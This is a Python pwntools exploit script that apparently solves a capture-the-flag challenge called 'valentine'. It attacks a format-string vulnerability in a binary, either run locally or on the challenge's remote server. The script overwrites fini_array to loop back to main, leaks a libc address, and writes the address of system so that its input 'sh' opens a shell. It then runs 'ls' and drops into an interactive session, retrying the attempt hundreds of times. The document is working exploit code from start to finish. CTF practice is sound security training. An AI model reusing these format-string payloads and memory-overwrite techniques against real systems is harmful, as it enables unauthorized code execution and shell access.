from pwn import *

# context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
elf = ELF(vuln_path)
libc = elf.libc


def ddebug(io, b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def pwn(io):
    valentine = "sh"
    exit_got = 0x404000
    printf_got = 0x404018
    main_addr = 0x4011d6
    fini_array = 0x403e00

    io.sendlineafter("valentine?", valentine)

    payload = b"%*13$p%8$n%34$hn" + p64(fini_array + (main_addr & 0xffff))[:-1]

    io.sendlineafter("name?", payload)
    io.recvuntil("0x")
    leak = int(io.recv(12), 16)
    libc.address = leak - 0x1f6b03
    log.success("libc.address :-----> " + hex(libc.address))

    system_addr = libc.symbols["system"]
    to_write = system_addr & 0xffffffff
    log.success("to_write :-----> " + hex(to_write))
    if to_write < 0x5000000:
        io.sendlineafter("valentine?", valentine)
        payload = f"%{to_write}c%8$n".encode()
        payload = payload.ljust(16, b"t")
        payload += p64(libc.address + 0x1f6080)
        # ddebug(io, "break *0x4012F1\n break *0x4011D6\n continue")
        io.sendlineafter("name?", payload)

        io.sendline(b"ls")
        io.interactive()


def getio():
    io = process([vuln_path]) if not f_remote else remote("valentine.chal.cubectf.com", 42042)
    return io


for i in range(0x300):
    log.success(f"-----------{i}--------------")
    io = None
    try:
        io = getio()
        pwn(io)
    except Exception as e:
        pass
    finally:
        if io:
            io.close()
